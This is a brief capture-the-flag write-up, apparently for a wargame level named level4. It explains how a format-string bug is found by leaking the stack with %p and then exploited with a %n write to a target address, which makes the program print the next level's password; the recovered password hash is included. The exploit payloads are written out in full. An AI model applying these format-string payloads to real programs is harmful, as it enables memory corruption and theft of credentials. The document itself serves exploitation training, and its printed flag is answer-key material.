Again like the previous level the begin is the same.

We are in the `n` function, `n` calls `fgets` then calls `p` (witch only calls `printf`),
then compare the return of `p` (witch is the return of `printf`) to **0x1025544** (16930116).
Except `eax` is set to 0 just before, if the comparaison is true it will call 
`system("/bin/cat /home/user/level5/.pass")`

So let's mess around with the memory.

(python -c 'print("AAAA" + "%p " * 15)'; cat) | ./level4
> AAAA0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758 0x804848d 0xbffff550 0x200 0xb7fd1ac0 0xb7ff37d0 **0x41414141** 0x25207025 0x70252070 0x20702520

and 0x414141... is located at the 12th position.

**0x8049810** is the value we want to modify (see n function file).

`(python -c 'print("\x10\x98\x04\x08" + "a" * 16930112 + "%12$n")'; cat) | ./level4`

But the buffer to `fgets` is to "little" for what we want to do (around 512).

`(python -c 'print("\x10\x98\x04\x08" + "%16930112c%12$n")'; cat) | ./level4`

> 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a